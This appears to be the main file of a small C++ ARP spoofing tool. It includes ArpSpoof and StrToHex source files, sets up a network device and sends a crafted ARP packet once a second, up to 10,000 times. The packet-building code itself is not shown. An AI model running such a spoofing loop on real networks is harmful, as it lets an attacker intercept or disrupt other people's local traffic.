#include "ArpSpoof.h"
#include "ArpSpoof.cpp"
#include "StrToHex.h"
#include "StrToHex.cpp"
#include <iostream>


using std::cout;
using std::cin;
using std::endl;

int main()
{
    ArpSpoof arpspoof;
    arpspoof.initDevice();
    arpspoof.SetArpPacker();
    int i = 10000;
    while (i>0)
    {
        arpspoof.SendPacket();
        Sleep(1000);
        i--;
    }
    
    cin.get();
}